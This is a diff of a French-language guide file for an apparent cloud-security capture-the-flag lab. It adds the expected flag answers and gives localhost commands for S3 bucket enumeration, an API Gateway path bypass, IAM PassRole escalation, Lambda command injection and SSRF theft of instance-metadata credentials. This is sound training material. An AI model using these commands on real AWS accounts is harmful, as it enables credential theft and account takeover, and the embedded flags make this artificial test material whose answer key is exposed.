@@ -19,7 +19,7 @@ export const guides: Record<string, ChallengeGuide> = {
       },
       {
         title: "Récupération du flag",
-        detail: "Un fichier de configuration a été trouvé. Affichez son contenu directement dans la console pour y lire le flag attendu.",
+        detail: "Un fichier de configuration a été trouvé. Affichez son contenu directement dans la console pour y lire le flag attendu. Le flag attendu est **PCE{s3_public_bucket_recon_2024}**.",
         command: "aws --no-sign-request --endpoint-url http://localhost:9000 s3 cp s3://pce-corp-backups/backups/old-config.env -"
       }
     ]
@@ -37,26 +37,31 @@ export const guides: Record<string, ChallengeGuide> = {
       },
       {
         title: "Énumération des ressources",
-        detail: "Lancez une requête d'énumération non authentifiée vers les ressources cibles (par exemple un bucket ou une API publique). Le flag attendu est **PCE{...}**.",
-        command: "aws s3api get-bucket-acl --bucket <target_bucket> --no-sign-request"
+        detail: "Lancez une requête d'énumération non authentifiée vers le bucket cible découvert (pceroot-public-assets) pour vérifier son accès.",
+        command: "aws s3 ls s3://pceroot-public-assets/ --no-sign-request"
+      },
+      {
+        title: "Récupération du flag",
+        detail: "Le fichier flag.txt est présent dans le bucket. Affichez son contenu. Le flag attendu est **PCE{unauth_s3_buck3t_enum_2026}**.",
+        command: "aws s3 cp s3://pceroot-public-assets/flag.txt - --no-sign-request"
       }
     ]
   },
   // 1.1.3
   '1.1.3': {
-    context: "API Gateway est souvent utilisé pour exposer des services internes. Si l'authentification (IAM, Cognito, ou Custom Authorizer) est mal configurée, des endpoints peuvent être accessibles publiquement.",
+    context: "API Gateway est souvent utilisé pour exposer des services internes. Si l'authentification est mal configurée, des endpoints peuvent être accessibles publiquement.",
     objective: "Découvrir et interagir avec un endpoint API Gateway non protégé.",
     concepts: ["API Gateway", "REST API", "Missing Authentication"],
     steps: [
       {
         title: "Reconnaissance de l'API",
-        detail: "Utilisez `curl` pour interroger l'URL de l'API Gateway découverte. Cherchez des endpoints documentés ou communs comme `/api/v1/users` ou `/status`.",
-        command: "curl -s https://<api_id>.execute-api.<region>.amazonaws.com/prod/status"
+        detail: "Récupérez et analysez la documentation Swagger pour identifier les endpoints exposés sur l'API Gateway locale.",
+        command: "curl -s http://localhost:8080/swagger.json"
       },
       {
         title: "Exploitation de l'endpoint vulnérable",
-        detail: "Accédez à l'endpoint contenant des données sensibles ou des fonctionnalités d'administration non protégées. Le flag attendu est **PCE{...}**.",
-        command: "curl -s https://<api_id>.execute-api.<region>.amazonaws.com/prod/admin/flag"
+        detail: "L'analyse a révélé un endpoint contenant le flag non protégé par l'API Gateway. Accédez-y directement. Le flag attendu est **PCE{api_gw_unprotected_2026}**.",
+        command: "curl -s http://localhost:8080/admin/flag"
       }
     ]
   },
@@ -67,14 +72,19 @@ export const guides: Record<string, ChallengeGuide> = {
     concepts: ["OSINT", "Certificate Transparency", "Passive Recon"],
     steps: [
       {
-        title: "Recherche sur crt.sh",
-        detail: "Interrogez les logs de Certificate Transparency pour trouver des sous-domaines (potentiellement des API Gateway, CloudFront ou ELB) appartenant à la cible.",
-        command: "curl -s 'https://crt.sh/?q=%.<target_domain>&output=json' | jq -r '.[].name_value' | sort -u"
+        title: "Recherche d'informations",
+        detail: "Utilisez l'outil de reconnaissance fourni pour identifier les actifs exposés par MegaCloudCorp.",
+        command: "recon_tool MegaCloudCorp"
       },
       {
-        title: "Identification et récupération du flag",
-        detail: "Visitez le sous-domaine découvert qui expose publiquement des informations critiques. Le flag attendu est **PCE{...}**.",
-        command: "curl -s https://<hidden_subdomain>.<target_domain>/flag"
+        title: "Exploration du bucket découvert",
+        detail: "L'outil a révélé un bucket S3 associé. Utilisez le client S3 simulé pour lister son contenu.",
+        command: "s3_client ls megacloudcorp-public-backup"
+      },
+      {
+        title: "Récupération du flag",
+        detail: "Téléchargez le fichier contenant le flag et affichez-le. Le flag attendu est **PCE{passive_recon_reveals_all_2024}**.",
+        command: "s3_client cp megacloudcorp-public-backup/secret_flag.txt . && cat secret_flag.txt"
       }
     ]
   },
@@ -86,12 +96,12 @@ export const guides: Record<string, ChallengeGuide> = {
     steps: [
       {
         title: "Tentative d'énumération (Échec partiel attendu)",
-        detail: "Vous savez que le bucket 'pce-marketing-public' existe. Si vous essayez de le lister récursivement pour tout voir d'un coup, vous verrez seulement la surface.",
+        detail: "Vous savez que le bucket 'pce-marketing-public' existe. Si vous essayez de le lister récursivement pour tout voir d'un coup, vous verrez seulement la surface car le listage n'est pas autorisé.",
         command: "aws --no-sign-request --endpoint-url http://localhost:9000 s3 ls s3://pce-marketing-public --recursive"
       },
       {
         title: "Exfiltration du fichier caché",
-        detail: "Un prefix interne a été deviné (ou fuité). Vous pouvez télécharger le fichier spécifique sans avoir besoin de lister le bucket entier. Le flag attendu est **PCE{...}**.",
+        detail: "Un prefix interne a été deviné (ou fuité). Vous pouvez télécharger le fichier spécifique sans avoir besoin de lister le bucket entier. Le flag attendu est **PCE{s3_exfil_hidden_prefix_2024}**.",
         command: "aws --no-sign-request --endpoint-url http://localhost:9000 s3 cp s3://pce-marketing-public/internal/hr/employees-export.csv -"
       }
     ]
@@ -104,13 +114,13 @@ export const guides: Record<string, ChallengeGuide> = {
     steps: [
       {
         title: "Accès refusé sur l'endpoint protégé",
-        detail: "Un accès direct à `/admin` renverra un code 401 ou 403.",
-        command: "curl -I https://<api_id>.execute-api.<region>.amazonaws.com/prod/admin"
+        detail: "Un accès direct à `/admin` renverra un code 401 ou 403 car il exige une authentification.",
+        command: "curl -I http://localhost:8080/admin"
       },
       {
         title: "Contournement via normalisation",
-        detail: "Utilisez des séquences comme `../` ou une normalisation de chemin pour atteindre l'endpoint protégé via un endpoint public. Le flag attendu est **PCE{...}**.",
-        command: "curl -s 'https://<api_id>.execute-api.<region>.amazonaws.com/prod/public/..%2fadmin/flag'"
+        detail: "Utilisez des séquences comme `../` pour atteindre l'endpoint protégé via un endpoint public (comme `/public`). L'API Gateway interprétera mal la requête tandis que le backend résoudra le chemin vers `/admin`. Le flag attendu est **PCE{api_gateway_path_normalization_bypass_2024}**.",
+        command: "curl -s 'http://localhost:8080/public/..%2fadmin'"
       }
     ]
   },
@@ -121,32 +131,32 @@ export const guides: Record<string, ChallengeGuide> = {
     concepts: ["Amazon RDS", "Public Exposure", "Database Security"],
     steps: [
       {
-        title: "Résolution DNS de l'instance RDS",
-        detail: "Récupérez l'endpoint de la base de données et vérifiez si son adresse IP est publique.",
-        command: "dig +short <rds_endpoint>.rds.amazonaws.com"
+        title: "Énumération de l'instance RDS",
+        detail: "Récupérez les informations de la base de données via l'API AWS pour découvrir son adresse IP publique (endpoint).",
+        command: "aws rds describe-db-instances"
       },
       {
         title: "Connexion à la base de données",
-        detail: "Utilisez un client de base de données (ex: psql, mysql) avec les identifiants par défaut ou fuités pour vous connecter et extraire les données. Le flag attendu est **PCE{...}**.",
-        command: "psql -h <rds_endpoint>.rds.amazonaws.com -U postgres -c 'SELECT flag FROM secrets;'"
+        detail: "Utilisez le client MySQL avec les identifiants récupérés dans la configuration applicative pour vous connecter à l'endpoint RDS trouvé (remplacez `<rds_endpoint>` par l'adresse obtenue) et extraire les données secrètes. Le flag attendu est **PCE{rds_pUbl1c_2024}**.",
+        command: "mysql -h <rds_endpoint> -u admin -padmin123 -e 'SELECT * FROM secrets;'"
       }
     ]
   },
   // 1.2.4
   '1.2.4': {
-    context: "Les Security Groups agissent comme des pare-feu virtuels. Autoriser le trafic entrant depuis `0.0.0.0/0` (Internet) sur des ports critiques (ex: 22, 3389, 2375) expose l'infrastructure.",
+    context: "Les Security Groups agissent comme des pare-feu virtuels. Autoriser le trafic entrant depuis `0.0.0.0/0` (Internet) sur des ports inattendus expose l'infrastructure.",
     objective: "Identifier et exploiter un service exposé à cause d'un Security Group trop permissif.",
     concepts: ["Security Groups", "Firewall Rules", "Network Exposure"],
     steps: [
       {
-        title: "Scan de ports de l'instance",
-        detail: "Effectuez un scan Nmap rapide sur l'adresse IP publique de la cible pour découvrir les ports ouverts (ex: un port Redis ou Docker ouvert sur Internet).",
-        command: "nmap -Pn -p- -T4 <target_ip>"
+        title: "Analyse du Security Group",
+        detail: "Utilisez l'interface AWS CLI pour inspecter les règles du Security Group attaché et identifier le port laissé ouvert sur Internet.",
+        command: "aws ec2 describe-security-groups"
       },
       {
         title: "Exploitation du service exposé",
-        detail: "Connectez-vous au service mal protégé pour récupérer le flag. Le flag attendu est **PCE{...}**.",
-        command: "redis-cli -h <target_ip> GET flag"
+        detail: "Connectez-vous au service (une API HTTP tournant sur le port 8080) découvert via le Security Group trop permissif pour récupérer le flag. Le flag attendu est **PCE{cloud_sg_too_permissive_2024}**.",
+        command: "curl http://localhost:8080"
       }
     ]
   },
@@ -157,14 +167,19 @@ export const guides: Record<string, ChallengeGuide> = {
     concepts: ["IAM Privilege Escalation", "PassRole", "CreateAccessKey"],
     steps: [
       {
-        title: "Création d'une clé d'accès pour un autre utilisateur",
-        detail: "Utilisez vos permissions pour générer de nouvelles clés d'accès (Access Key) pour un utilisateur IAM ayant plus de droits ou des droits pour passer un rôle d'administration.",
-        command: "aws iam create-access-key --user-name <target_admin_user>"
+        title: "Reconnaissance IAM",
+        detail: "Vérifiez vos permissions et listez les rôles IAM disponibles pour trouver un profil administrateur (`admin-profile`) que vous pouvez assigner.",
+        command: "aws iam list-roles"
       },
       {
-        title: "Utilisation des privilèges élevés",
-        detail: "Configurez l'AWS CLI avec ces nouvelles clés et récupérez le flag depuis un service protégé (ex: Parameter Store ou S3). Le flag attendu est **PCE{...}**.",
-        command: "AWS_ACCESS_KEY_ID=<new_key> AWS_SECRET_ACCESS_KEY=<new_secret> aws ssm get-parameter --name /flag --with-decryption"
+        title: "Exploitation de PassRole",
+        detail: "Utilisez `ec2:RunInstances` en passant le rôle d'administration cible à la nouvelle instance. Cela valide la première étape de l'escalade.",
+        command: "aws ec2 run-instances --image-id ami-pce --iam-instance-profile Name=admin-profile"
+      },
+      {
+        title: "Création d'une clé d'accès",
+        detail: "Grâce à l'escalade effectuée, vous avez désormais le droit de générer de nouvelles clés d'accès (Access Key) pour l'utilisateur de service admin `admin-svc`. Le flag attendu est **PCE{passrole_createaccesskey_escalation_2024}**.",
+        command: "aws iam create-access-key --user-name admin-svc"
       }
     ]
   },
@@ -176,49 +191,26 @@ export const guides: Record<string, ChallengeGuide> = {
     steps: [
       {
         title: "Assumer le rôle vulnérable",
-        detail: "Exécutez la commande `assume-role` pour obtenir les identifiants temporaires du rôle cible.",
-        command: "aws sts assume-role --role-arn arn:aws:iam::<account_id>:role/<vuln_role> --role-session-name PivotSession"
+        detail: "Exécutez la commande `assume-role` pour obtenir les identifiants temporaires du rôle `admin-role`.",
+        command: "aws sts assume-role --role-arn arn:aws:iam::123456789012:role/admin-role --role-session-name PivotSession"
       },
       {
         title: "Récupération du flag avec la nouvelle identité",
-        detail: "Utilisez les clés générées (AccessKeyId, SecretAccessKey, SessionToken) pour accéder aux ressources de ce rôle. Le flag attendu est **PCE{...}**.",
-        command: "AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... aws s3 cp s3://<protected_bucket>/flag.txt - "
+        detail: "Utilisez les clés générées (AccessKeyId, SecretAccessKey, SessionToken) que vous venez de recevoir pour accéder au bucket secret et récupérer le flag. Le flag attendu est **PCE{assume_role_pivot_2024}**.",
+        command: "AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... aws s3 cp s3://secret-bucket/flag.txt -"
       }
     ]
   },
   // 1.3.3
   '1.3.3': {
     context: "Les fonctions AWS Lambda exécutent du code en réponse à des événements. Si l'entrée n'est pas assainie, elle peut mener à une exécution de commandes (RCE) dans l'environnement de la Lambda.",
-    objective: "Exploiter une injection de commande dans une fonction Lambda pour exfiltrer ses variables d'environnement.",
+    objective: "Exploiter une injection de commande dans une fonction Lambda pour exécuter du code arbitraire.",
     concepts: ["AWS Lambda", "Command Injection", "Serverless Security"],
     steps: [
       {
-        title: "Test de l'injection de commande",
-        detail: "Envoyez un payload via l'API Gateway ou le déclencheur de la Lambda pour exécuter une commande arbitraire comme `env`.",
-        command: "curl -X POST https://<api_id>.execute-api.<region>.amazonaws.com/prod/process -d '{\"input\": \"127.0.0.1; env\"}'"
-      },
-      {
-        title: "Lecture du flag dans l'environnement",
-        detail: "Analysez la réponse de la Lambda pour récupérer les variables d'environnement contenant le flag et les credentials temporaires de la Lambda. Le flag attendu est **PCE{...}**.",
-        command: "echo \"Le flag est dans les variables d'environnement renvoyées par la commande env.\""
-      }
-    ]
-  },
-  // 1.3.4
-  '1.3.4': {
-    context: "Avoir la permission `iam:AttachUserPolicy` ou `iam:AttachRolePolicy` sur sa propre identité permet d'attacher la politique 'AdministratorAccess' pour devenir administrateur total du compte.",
-    objective: "Attacher la politique gérée 'AdministratorAccess' à votre propre utilisateur IAM.",
-    concepts: ["IAM Privilege Escalation", "AttachUserPolicy", "AdministratorAccess"],
-    steps: [
-      {
-        title: "Vérification des politiques attachées",
-        detail: "Listez vos permissions actuelles pour confirmer la présence du droit d'attacher des politiques.",
-        command: "aws iam list-attached-user-policies --user-name <votre_user>"
-      },
-      {
-        title: "Escalade et récupération du flag",
-        detail: "Attachez AdministratorAccess à votre compte pour prendre le contrôle total, puis lisez le flag. Le flag attendu est **PCE{...}**.",
-        command: "aws iam attach-user-policy --user-name <votre_user> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+        title: "Exploitation de l'injection de commande",
+        detail: "Invoquez la fonction Lambda en injectant une commande système dans le paramètre cible. La commande `cat /home/lambda_user/flag.txt` lira le flag. Affichez ensuite la réponse renvoyée. Le flag attendu est **PCE{lambda_cmd_injection_2026}**.",
+        command: "aws lambda invoke --function-name NetworkTest --payload '{\"target\": \"127.0.0.1; cat /home/lambda_user/flag.txt\"}' out.json && cat out.json"
       }
     ]
   },
@@ -230,49 +222,49 @@ export const guides: Record<string, ChallengeGuide> = {
     steps: [
       {
         title: "Découverte du nom du rôle IAM",
-        detail: "Utilisez la vulnérabilité SSRF (ex: un paramètre `url=`) pour lister le nom du rôle attaché à l'instance.",
-        command: "curl 'http://<target_app>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'"
+        detail: "Utilisez la vulnérabilité SSRF (`/fetch?url=`) pour lister le nom du rôle attaché à l'instance via le service de métadonnées.",
+        command: "curl 'http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'"
       },
       {
         title: "Vol des identifiants (STS)",
-        detail: "Récupérez les AccessKey, SecretKey et SessionToken du rôle. Le flag attendu est **PCE{...}**.",
-        command: "curl 'http://<target_app>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>'"
+        detail: "Récupérez les AccessKey, SecretKey et SessionToken du rôle découvert (`pce-app-role`). Le flag attendu est **PCE{imds_ssrf_stolen_role_creds_2024}**.",
+        command: "curl 'http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/pce-app-role'"
       }
     ]
   },
   // 1.4.2
   '1.4.2': {
-    context: "IMDSv2 ajoute une couche de sécurité en exigeant un header `X-aws-ec2-metadata-token`. Toutefois, si la vulnérabilité SSRF permet d'injecter ou de contrôler les headers HTTP (ex: requêtes PUT), IMDSv2 peut être contourné.",
+    context: "IMDSv2 ajoute une couche de sécurité en exigeant un header `X-aws-ec2-metadata-token`. Toutefois, si la vulnérabilité SSRF permet d'injecter ou de contrôler les headers HTTP (ex: paramètre header de l'app), IMDSv2 peut être contourné.",
     objective: "Contourner IMDSv2 via l'injection de headers dans une requête SSRF.",
     concepts: ["SSRF", "IMDSv2", "Header Injection", "Bypass"],
     steps: [
       {
         title: "Génération du token IMDSv2",
-        detail: "Exploitez l'application pour envoyer une requête `PUT` vers l'endpoint de token avec le header `X-aws-ec2-metadata-token-ttl-seconds` pour récupérer le token.",
-        command: "curl -X POST -d 'method=PUT&url=http://169.254.169.254/latest/api/token&headers[X-aws-ec2-metadata-token-ttl-seconds]=21600' 'http://<target_app>/proxy'"
+        detail: "Exploitez l'application pour envoyer une requête `PUT` vers l'endpoint de token avec le header requis `X-aws-ec2-metadata-token-ttl-seconds`.",
+        command: "curl 'http://127.0.0.1:8080/fetch?url=http://127.0.0.1:9090/latest/api/token&method=PUT&header=X-aws-ec2-metadata-token-ttl-seconds:21600'"
       },
       {
         title: "Utilisation du token pour l'exfiltration",
-        detail: "Réutilisez le token récupéré dans une nouvelle requête SSRF pour accéder aux credentials. Le flag attendu est **PCE{...}**.",
-        command: "curl -X POST -d 'method=GET&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>&headers[X-aws-ec2-metadata-token]=<votre_token>' 'http://<target_app>/proxy'"
+        detail: "Réutilisez le token récupéré dans une nouvelle requête SSRF en l'incluant dans les headers pour accéder aux credentials du rôle `admin`. Le flag attendu est **PCE{1mdsv2_byp4ss_h34d3rs_2026}**.",
+        command: "curl \"http://127.0.0.1:8080/fetch?url=http://127.0.0.1:9090/latest/meta-data/iam/security-credentials/admin&header=X-aws-ec2-metadata-token:<TOKEN_OBTENU>\""
       }
     ]
   },
   // 1.4.3
   '1.4.3': {
-    context: "Même si l'accès à l'IMDS est bloqué ou protégé, une SSRF peut toujours être utilisée pour rebondir (pivoter) vers des services internes inaccessibles depuis Internet (ex: instances RDS, Redis, APIs internes).",
+    context: "Même si l'accès à l'IMDS depuis l'extérieur est bloqué, une SSRF peut toujours être utilisée pour rebondir (pivoter) vers des services internes inaccessibles depuis Internet.",
     objective: "Utiliser une SSRF pour interagir avec un service interne au VPC.",
     concepts: ["SSRF", "Internal Network Pivot", "VPC Security"],
     steps: [
       {
-        title: "Scan du réseau interne via SSRF",
-        detail: "Fuzz ou parcourez les adresses IP privées (ex: `10.0.0.x`) via le paramètre vulnérable pour trouver des services actifs.",
-        command: "ffuf -w wordlist_ips.txt -u 'http://<target_app>/fetch?url=http://FUZZ:80/status'"
+        title: "Énumération via SSRF",
+        detail: "Utilisez la SSRF exposée sur le port 8000 pour atteindre le service de métadonnées interne simulé sur `127.0.0.1:8080`.",
+        command: "curl 'http://localhost:8000/proxy?url=http://127.0.0.1:8080/latest/meta-data/'"
       },
       {
         title: "Accès au service interne",
-        detail: "Interagissez avec l'API interne découverte (ex: un serveur d'administration local) pour récupérer le flag. Le flag attendu est **PCE{...}**.",
-        command: "curl 'http://<target_app>/fetch?url=http://10.0.0.54:8080/admin/flag'"
+        detail: "Interagissez avec le chemin des credentials pour récupérer les clés d'accès. L'application bloque l'accès direct par curl, mais permet l'accès via son propre proxy. Le flag attendu est **PCE{ssrf_m3t4d4t4_2026}**.",
+        command: "curl 'http://localhost:8000/proxy?url=http://127.0.0.1:8080/latest/meta-data/iam/security-credentials/ec2-role'"
       }
     ]
   }
